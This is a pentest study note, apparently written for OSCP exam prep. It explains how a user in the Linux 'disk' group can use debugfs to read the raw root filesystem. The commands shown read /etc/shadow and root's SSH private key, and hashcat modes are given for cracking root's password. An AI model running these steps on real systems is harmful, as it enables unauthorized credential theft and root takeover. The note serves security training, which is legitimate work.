# debugfs — Raw Filesystem Access via `disk` Group (OSCP)

`debugfs` is an **ext2/3/4 filesystem debugger**.
It opens a **block device directly** and reads/writes the filesystem on it, **bypassing normal file permissions** — because those permissions are enforced by the mounted filesystem layer, and debugfs goes underneath it to the raw device.

→ Privesc use: if your user is in the **`disk` group**, you have read/write on the disk block devices, so you can read **any file on the system regardless of owner/mode** — including root-only files.

---

## When to Use

- `id` shows you're in the `disk` group:
  ```
  uid=1000(dora) gid=1000(dora) groups=1000(dora),6(disk)
  ```
- linpeas flags **`disk`** group membership (red/yellow).
- You need to read a root-only file (`/etc/shadow`, `/root/.ssh/id_rsa`, `/root/proof.txt`) but you're low-priv.

---

## Step 1 — Find the Device Holding `/`

```bash
lsblk
```

Read the **MOUNTPOINT** column and find what's mounted at `/`. Two cases:

- **Plain partition:** `/` sits on `/dev/sda2` (or similar) → that's your device.
- **LVM (common on Ubuntu):** `/` sits on a logical volume, e.g. `ubuntu--vg-ubuntu--lv`.

**LVM device path — decode it from the MAJ:MIN column:**
```
└─ubuntu--vg-ubuntu--lv 253:0  ...  /
```
Major **253** = device-mapper → the raw node is **`/dev/dm-<minor>`**, so `253:0` = **`/dev/dm-0`**.
LVM also creates friendly symlinks to the same node:
- `/dev/mapper/<vg>-<lv>`  (e.g. `/dev/mapper/ubuntu--vg-ubuntu--lv`)
- `/dev/<vg>/<lv>`

All three point to the same block device — use any.

Confirm group access (you want group `disk` with `rw`):
```bash
ls -l /dev/dm-0
# brw-rw---- 1 root disk 253, 0 ... /dev/dm-0   ← disk group can read/write
```

---

## Step 2 — Open the Filesystem

Opens **read-only by default** (safe — no risk to the filesystem):
```bash
debugfs /dev/dm-0
```
You drop into a `debugfs:` prompt. Paths are the **real** filesystem paths (`/root`, `/etc`, …).

---

## Command Reference

| Command | What it does |
|---|---|
| `ls <dir>` | List a directory |
| `cd <dir>` | Change directory context |
| `cat <file>` | Print a file's contents to screen |
| `stat <file>` | Inode details — owner, perms, size |
| `dump <file> <out>` | Copy one file **out** to your shell's filesystem |
| `rdump <dir> <out>` | Recursively copy a directory out |
| `q` | Quit |

> `dump`/`rdump` need **two** args — source on the target fs, and the output path on your current shell (e.g. `/tmp`).

---

## Step 3 — Read Root Secrets

**Grab a root-only flag / file directly:**
```
debugfs:  cat /root/proof.txt
```

**Look for a root SSH private key** — instant login if present:
```
debugfs:  ls /root/.ssh
debugfs:  cat /root/.ssh/id_rsa
```
→ Copy it to Kali, `chmod 600 id_rsa`, then `ssh -i id_rsa root@<target>`.

**Pull `/etc/shadow` to crack root** — the reliable escalation:
```
debugfs:  cat /etc/shadow 
```

Take root's hash (between the 1st and 2nd colons), match the prefix to a mode, crack, then `su root`:
- `$6$` → sha512crypt → `hashcat -m 1800`
- `$1$` → md5crypt → `-m 500`
- `$y$` → yescrypt → `-m 27200`

See [[Hashcat]] for the full crack workflow.

---

## Related Notes

- [[Hashcat]]
- [[JohntheRipper]]
- [[Find]]
